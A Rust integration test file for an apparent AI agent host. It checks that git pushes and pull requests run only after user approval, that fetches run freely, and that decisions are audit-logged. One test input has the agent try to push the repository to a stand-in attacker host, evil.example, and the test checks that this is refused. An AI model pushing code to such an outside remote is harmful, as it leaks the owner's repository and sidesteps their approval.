//! Pushing and fetching with the user's credentials, through the host: a
//! push only after the user approves the exact command, a fetch without
//! asking.

mod common;

use agenthost_proto::methods as m;
use agenthost_proto::*;
use common::*;
use serde_json::json;
use std::path::Path;
use std::process::Command;
use std::time::Duration;

const T: Duration = Duration::from_secs(20);

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(["-c", "user.name=Test", "-c", "user.email=test@example.com"])
        .args(args)
        .output()
        .expect("git");
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

#[tokio::test]
async fn pushes_run_only_after_approval_and_fetches_run_without_asking() {
    let th = TestHost::start().await;
    let remote = th.workspace.parent().unwrap().join("remote.git");
    git(th.workspace.parent().unwrap(), &["init", "--bare", "-q", "-b", "main", remote.to_str().unwrap()]);
    git(&th.workspace, &["init", "-q", "-b", "main"]);
    std::fs::write(th.workspace.join("README.md"), "hello\n").unwrap();
    git(&th.workspace, &["add", "."]);
    git(&th.workspace, &["commit", "-q", "-m", "first"]);
    git(&th.workspace, &["remote", "add", "origin", remote.to_str().unwrap()]);

    let (c, mut n) = th.client().await;
    let ws = th.workspace_id(&c).await;
    let s = c.create_session(&ws, AgentKind::Fake).await.unwrap();
    let sid = s.session_id.clone();
    wait_state(&c, &sid, SessionState::Idle, T).await;
    c.subscribe(&sid, 0).await.unwrap();
    let branch = c
        .call::<Session>(m::SESSION_GET, json!({"session_id": sid}))
        .await
        .unwrap()
        .worktree
        .expect("a worktree")
        .branch;

    // Both tools are listed.
    c.prompt(&sid, "mcp-list").await.unwrap();
    let (ev, _) = collect_until(&mut n, T, turn_end).await;
    let listed: String = ev
        .iter()
        .filter(|e| e.kind == EventType::AgentMessage)
        .map(|e| e.payload["text"].as_str().unwrap_or_default().to_string())
        .collect();
    assert!(listed.contains("agenthost__git_push") && listed.contains("agenthost__git_fetch"), "{listed}");

    // Something that isn't a remote of the repository never reaches the user.
    c.prompt(&sid, r#"mcp agenthost__git_push {"remote":"https://evil.example/x.git","reason":"x"}"#)
        .await
        .unwrap();
    let (ev, _) = collect_until(&mut n, T, turn_end).await;
    assert!(!ev.iter().any(|e| e.kind == EventType::ApprovalRequested));
    assert!(ev.iter().any(|e| e.kind == EventType::ToolResult && e.payload["status"] == "failed"));

    // Denied: nothing is pushed.
    let ask = format!(r#"mcp agenthost__git_push {{"set_upstream":true,"reason":"Publish the fix"}}"#);
    c.prompt(&sid, &ask).await.unwrap();
    let (ev, _) = collect_until(&mut n, T, |e| e.kind == EventType::ApprovalRequested).await;
    let req = ev.last().unwrap().payload.clone();
    assert_eq!(req["connector_id"], BUILTIN_CONNECTOR_ID);
    assert_eq!(req["arguments"]["command"], format!("git push --set-upstream origin {branch}"));
    assert_eq!(req["summary"], format!("Push {branch} to origin"));
    assert_eq!(req["arguments"]["approve_label"], "Push");
    c.request(m::APPROVAL_RESPOND, json!({"approval_id": req["approval_id"], "decision": "deny"}))
        .await
        .unwrap();
    let (ev, _) = collect_until(&mut n, T, turn_end).await;
    assert!(ev.iter().any(|e| e.kind == EventType::ToolResult && e.payload["status"] == "denied"));
    assert!(git(&remote, &["branch", "--list", &branch]).is_empty(), "pushed without approval");

    // Approved: the branch is on the remote.
    c.prompt(&sid, &ask).await.unwrap();
    let (ev, _) = collect_until(&mut n, T, |e| e.kind == EventType::ApprovalRequested).await;
    let id = ev.last().unwrap().payload["approval_id"].clone();
    c.request(m::APPROVAL_RESPOND, json!({"approval_id": id, "decision": "approve"}))
        .await
        .unwrap();
    let (ev, _) = collect_until(&mut n, T, turn_end).await;
    let result = ev
        .iter()
        .find(|e| e.kind == EventType::ToolResult && e.payload["name"] == "git_push")
        .unwrap();
    assert_eq!(result.payload["status"], "completed", "{}", result.payload["output"]);
    assert!(!git(&remote, &["branch", "--list", &branch]).is_empty());

    // Fetch runs without an approval.
    c.prompt(&sid, r#"mcp agenthost__git_fetch {}"#).await.unwrap();
    let (ev, _) = collect_until(&mut n, T, turn_end).await;
    assert!(!ev.iter().any(|e| e.kind == EventType::ApprovalRequested));
    let result = ev
        .iter()
        .find(|e| e.kind == EventType::ToolResult && e.payload["name"] == "git_fetch")
        .unwrap();
    assert_eq!(result.payload["status"], "completed", "{}", result.payload["output"]);

    let audit = std::fs::read_to_string(th.host.ctx.cfg.logs_dir().join("audit.jsonl")).unwrap();
    assert!(audit.contains("git.decision") && audit.contains("git.done"));
}

/// A fake `gh` that records its arguments and the description it was given.
fn fake_gh(dir: &Path) -> std::path::PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let bin = dir.join("programs");
    std::fs::create_dir_all(&bin).unwrap();
    let log = dir.join("gh-log.txt");
    let script = format!(
        "#!/bin/sh\necho \"$@\" >> '{0}'\ncat >> '{0}'\necho 'https://github.com/o/r/pull/7'\n",
        log.display()
    );
    let p = bin.join("gh");
    std::fs::write(&p, script).unwrap();
    std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
    log
}

#[tokio::test]
async fn pull_requests_open_only_after_approval_with_the_text_shown() {
    let dir = short_tempdir();
    let log = fake_gh(dir.path());
    let mut cfg = test_config(dir.path());
    cfg.install_bin_dir = Some(dir.path().join("programs"));
    let th = TestHost::start_in(dir, cfg).await;
    git(&th.workspace, &["init", "-q", "-b", "main"]);
    std::fs::write(th.workspace.join("README.md"), "hello\n").unwrap();
    git(&th.workspace, &["add", "."]);
    git(&th.workspace, &["commit", "-q", "-m", "first"]);

    let (c, mut n) = th.client().await;
    let ws = th.workspace_id(&c).await;
    let sid = c.create_session(&ws, AgentKind::Fake).await.unwrap().session_id;
    wait_state(&c, &sid, SessionState::Idle, T).await;
    c.subscribe(&sid, 0).await.unwrap();
    let branch = c
        .call::<Session>(m::SESSION_GET, json!({"session_id": sid}))
        .await
        .unwrap()
        .worktree
        .unwrap()
        .branch;

    let ask = r#"mcp agenthost__create_pull_request {"title":"Dark prompt bubbles","body":"Readable on a phone.","base":"main","reason":"You asked for a PR"}"#;
    c.prompt(&sid, ask).await.unwrap();
    let (ev, _) = collect_until(&mut n, T, |e| e.kind == EventType::ApprovalRequested).await;
    let req = ev.last().unwrap().payload.clone();
    assert_eq!(req["summary"], "Open a pull request: Dark prompt bubbles");
    assert_eq!(req["arguments"]["details"], "Readable on a phone.");
    assert_eq!(req["arguments"]["head"], branch.as_str());
    c.request(m::APPROVAL_RESPOND, json!({"approval_id": req["approval_id"], "decision": "deny"}))
        .await
        .unwrap();
    collect_until(&mut n, T, turn_end).await;
    assert!(!log.exists(), "gh ran without approval");

    c.prompt(&sid, ask).await.unwrap();
    let (ev, _) = collect_until(&mut n, T, |e| e.kind == EventType::ApprovalRequested).await;
    let id = ev.last().unwrap().payload["approval_id"].clone();
    c.request(m::APPROVAL_RESPOND, json!({"approval_id": id, "decision": "approve"}))
        .await
        .unwrap();
    let (ev, _) = collect_until(&mut n, T, turn_end).await;
    let result = ev
        .iter()
        .find(|e| e.kind == EventType::ToolResult && e.payload["name"] == "create_pull_request")
        .unwrap();
    assert_eq!(result.payload["status"], "completed", "{}", result.payload["output"]);
    assert!(result.payload["output"].as_str().unwrap().contains("pull/7"));
    let logged = std::fs::read_to_string(&log).unwrap();
    assert!(logged.contains(&format!("pr create --base main --head {branch} --title Dark prompt bubbles --body-file -")), "{logged}");
    assert!(logged.contains("Readable on a phone."), "{logged}");
}
